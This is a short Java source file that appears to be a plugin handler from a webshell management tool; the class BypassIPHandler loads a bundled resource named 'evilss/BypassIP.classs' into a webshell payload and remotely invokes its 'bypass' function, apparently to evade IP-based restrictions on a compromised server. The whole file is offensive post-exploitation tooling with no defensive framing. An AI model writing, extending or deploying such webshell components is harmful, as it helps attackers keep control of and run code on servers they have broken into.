package shells.plugins.java.handler;

import util.functions;
import util.http.ReqParameter;

public class BypassIPHandler extends HandlerBase{
    public String handler() {
        this.payload.include("BypassIP", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/BypassIP.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("BypassIP", "bypass", reqParameter));
    }
}
